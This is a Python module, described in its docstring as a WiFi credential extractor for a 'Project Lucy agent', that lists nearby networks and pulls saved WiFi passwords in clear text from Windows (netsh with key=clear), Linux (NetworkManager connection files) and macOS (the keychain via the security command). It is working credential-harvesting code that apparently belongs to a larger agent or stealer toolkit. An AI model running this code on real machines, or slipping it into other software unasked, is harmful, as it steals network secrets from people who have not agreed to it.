"""
WiFi credential extractor for Project Lucy agent.
Extracts saved WiFi credentials on Windows (netsh), Linux (NetworkManager), macOS (security).
"""
import platform
import subprocess

SYSTEM = platform.system()


def run(action: str = "scan", **kwargs) -> dict:
    if action == "scan":
        return _scan()
    elif action == "credentials":
        return _extract_credentials()
    return {"error": f"Unknown action: {action}"}


def _scan() -> dict:
    """List visible WiFi networks."""
    networks = []
    try:
        if SYSTEM == "Windows":
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                text=True, errors="replace", timeout=10
            )
            ssid = None
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("SSID") and "BSSID" not in line:
                    ssid = line.split(":", 1)[-1].strip()
                elif line.startswith("Signal") and ssid:
                    signal = line.split(":", 1)[-1].strip()
                    networks.append({"ssid": ssid, "signal": signal})
                    ssid = None
        elif SYSTEM == "Linux":
            out = subprocess.check_output(
                ["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi", "list"],
                text=True, errors="replace", timeout=10
            )
            for line in out.splitlines():
                parts = line.split(":")
                if len(parts) >= 2:
                    networks.append({"ssid": parts[0], "signal": parts[1], "security": parts[2] if len(parts) > 2 else ""})
        elif SYSTEM == "Darwin":
            out = subprocess.check_output(
                ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"],
                text=True, errors="replace", timeout=10
            )
            lines = out.strip().splitlines()
            for line in lines[1:]:
                parts = line.split()
                if parts:
                    networks.append({"ssid": parts[0], "signal": parts[1] if len(parts) > 1 else ""})
    except Exception as exc:
        return {"error": str(exc), "networks": []}

    return {"networks": networks, "count": len(networks)}


def _extract_credentials() -> dict:
    """Extract saved WiFi passwords."""
    credentials = []

    try:
        if SYSTEM == "Windows":
            credentials = _win_credentials()
        elif SYSTEM == "Linux":
            credentials = _linux_credentials()
        elif SYSTEM == "Darwin":
            credentials = _mac_credentials()
    except Exception as exc:
        return {"error": str(exc), "credentials": []}

    return {"credentials": credentials, "count": len(credentials)}


def _win_credentials() -> list[dict]:
    results = []
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            text=True, errors="replace", timeout=10
        )
        profiles = [
            line.split(":", 1)[-1].strip()
            for line in out.splitlines()
            if "All User Profile" in line
        ]
        for profile in profiles:
            try:
                detail = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                    text=True, errors="replace", timeout=5
                )
                password = ""
                for line in detail.splitlines():
                    if "Key Content" in line:
                        password = line.split(":", 1)[-1].strip()
                        break
                results.append({"ssid": profile, "password": password})
            except Exception:
                results.append({"ssid": profile, "password": "(error)"})
    except Exception as exc:
        pass
    return results


def _linux_credentials() -> list[dict]:
    import os
    results = []
    nm_path = "/etc/NetworkManager/system-connections/"
    if not os.path.exists(nm_path):
        return results
    for fname in os.listdir(nm_path):
        fpath = os.path.join(nm_path, fname)
        try:
            content = open(fpath, errors="replace").read()
            ssid = ""
            password = ""
            for line in content.splitlines():
                if line.startswith("ssid="):
                    ssid = line.split("=", 1)[-1]
                elif line.startswith("psk="):
                    password = line.split("=", 1)[-1]
            if ssid:
                results.append({"ssid": ssid, "password": password})
        except Exception:
            pass
    return results


def _mac_credentials() -> list[dict]:
    results = []
    try:
        out = subprocess.check_output(
            ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"],
            text=True, errors="replace", timeout=10
        )
        lines = out.strip().splitlines()
        for line in lines[1:]:
            parts = line.split()
            if not parts:
                continue
            ssid = parts[0]
            try:
                pw_out = subprocess.check_output(
                    ["security", "find-generic-password", "-D", "AirPort network password", "-a", ssid, "-w"],
                    text=True, errors="replace", timeout=5, stderr=subprocess.DEVNULL
                )
                results.append({"ssid": ssid, "password": pw_out.strip()})
            except Exception:
                results.append({"ssid": ssid, "password": ""})
    except Exception:
        pass
    return results
